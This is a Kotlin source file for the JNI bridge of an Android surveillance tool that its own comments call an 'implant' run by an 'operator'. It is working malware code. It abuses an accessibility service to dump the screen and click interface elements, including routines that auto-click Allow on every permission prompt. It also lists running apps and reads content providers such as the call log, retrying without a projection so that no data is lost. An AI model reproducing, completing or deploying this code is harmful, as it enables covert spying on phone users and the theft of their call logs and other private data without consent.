package com.shadow

import android.content.Context
import android.util.Log
import java.util.UUID

/**
 * Kotlin-side implementation of the primitives the Rust core shells out to.
 * Each function is invoked from Rust via JNI (see core/src/android_bridge.rs).
 * Everything here runs in-process with the implant's own UID — no root, no Shizuku.
 *
 * @JvmStatic is REQUIRED on every function below, not cosmetic: members of an
 * `object` otherwise exist only as instance methods on the singleton, while the
 * Rust side resolves them with CallStaticObjectMethod. Drop the annotation and
 * the method silently disappears from the static lookup, so the call fails with
 * NoSuchMethodError and the operator sees only "Java exception was thrown".
 * The descriptor passed from Rust must also match exactly (proto_for()).
 */
object ShadowBridge {
    private const val TAG = "ShadowBridge"

    /** Read screen as a text tree (a11y). */
    @JvmStatic
    fun dumpScreen(): String =
        com.shadow.a11y.ShadowAccessibilityService.instance?.dumpScreen() ?: "a11y not active"

    /** Click a node by visible text / content description (a11y). */
    @JvmStatic
    fun clickByText(needle: String): Boolean =
        com.shadow.a11y.ShadowAccessibilityService.instance?.clickByText(needle) ?: false

    /** Click a node by resource id (a11y). */
    @JvmStatic
    fun clickNodeById(viewId: String): Boolean =
        com.shadow.a11y.ShadowAccessibilityService.instance?.clickNodeById(viewId) ?: false

    /** Open Settings → app permissions and auto-click Allow for all declared perms. */
    @JvmStatic
    fun startAutoGrant(): String {
        val svc = com.shadow.a11y.ShadowAccessibilityService.instance
            ?: return "a11y not active — cannot auto-grant"
        svc.startAutoGrant()
        return "auto-grant started"
    }

    /** List permissions actually granted to this app (PackageManager, own UID). */
    @JvmStatic
    fun grantedPermissions(): String {
        val ctx = ShadowApp.appContext ?: return "no context"
        return try {
            val pkg = ctx.packageName
            val pm = ctx.packageManager
            val info = pm.getPackageInfo(pkg, android.content.pm.PackageManager.GET_PERMISSIONS)
            val requested = info.requestedPermissions ?: emptyArray()
            val out = StringBuilder()
            for (p in requested) {
                val ok = pm.checkPermission(p, pkg) == android.content.pm.PackageManager.PERMISSION_GRANTED
                out.append(if (ok) "GRANTED " else "DENIED  ").append(p).append('\n')
            }
            out.toString()
        } catch (e: Throwable) {
            "grantedPermissions error: ${e.message}"
        }
    }

    /** Recents dump — "all the rest of the buttons" fodder. */
    @JvmStatic
    fun runningApps(): String {
        val ctx = ShadowApp.appContext ?: return "no context"
        return try {
            val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val procs = am.runningAppProcesses ?: emptyList()
            procs.joinToString("\n") { "${it.processName} (pid=${it.pid})" }
        } catch (e: Throwable) {
            "runningApps error: ${e.message}"
        }
    }

    /**
     * Read a content:// provider with our OWN UID. No shell, no root.
     * Works once the matching runtime permission is granted (see startAutoGrant).
     */
    @JvmStatic
    fun queryProvider(uri: String, projection: String, limit: Int): String {
        val ctx = ShadowApp.appContext ?: return "no context"
        return try {
            val proj = if (projection.isBlank()) null else projection.split(",").toTypedArray()
            val cursor = ctx.contentResolver.query(
                android.net.Uri.parse(uri), proj, null, null, null
            ) ?: return "provider returned null (uri=$uri)"

            val sb = StringBuilder()
            val cols = cursor.columnNames
            sb.append(cols.joinToString("\t")).append('\n')
            var n = 0
            while (cursor.moveToNext() && n < limit) {
                val row = cols.map { c ->
                    val i = cursor.getColumnIndex(c)
                    if (i < 0) "" else (cursor.getString(i) ?: "")
                }
                sb.append(row.joinToString("\t")).append('\n')
                n++
            }
            cursor.close()
            if (n == 0) "empty: $uri" else "rows=$n\n$sb"
        } catch (e: SecurityException) {
            "permission denied for $uri — run auto-grant first (${e.message})"
        } catch (e: IllegalArgumentException) {
            // OEM providers reject columns AOSP documents (call_log cached_name is
            // rejected on ColorOS). Retry unprojected rather than losing the data.
            queryUnprojected(ctx, uri, limit, e.message ?: "invalid projection")
        } catch (e: Throwable) {
            "queryProvider error: ${e.message}"
        }
    }
}

/**
 * Re-run a provider query asking for no projection (the provider returns all
 * columns), used when a requested column is rejected. The header records the
 * fallback so the operator knows the column set is wider than requested.
 */
private fun queryUnprojected(
    ctx: android.content.Context,
    uri: String,
    limit: Int,
    reason: String,
): String {
    return try {
        val cursor = ctx.contentResolver.query(
            android.net.Uri.parse(uri), null, null, null, null
        ) ?: return "provider returned null (uri=$uri; projection rejected: $reason)"
        val sb = StringBuilder()
        val cols = cursor.columnNames
        sb.append("[projection rejected: $reason — returning all columns]\t")
            .append(cols.joinToString("\t")).append('\n')
        var n = 0
        while (cursor.moveToNext() && n < limit) {
            sb.append(cols.joinToString("\t") { c ->
                val i = cursor.getColumnIndex(c)
                if (i < 0) "" else (cursor.getString(i) ?: "")
            }).append('\n')
            n++
        }
        cursor.close()
        if (n == 0) "empty: $uri" else "rows=$n\n$sb"
    } catch (e: Throwable) {
        "queryProvider error: ${e.message} (after projection fallback)"
    }
}
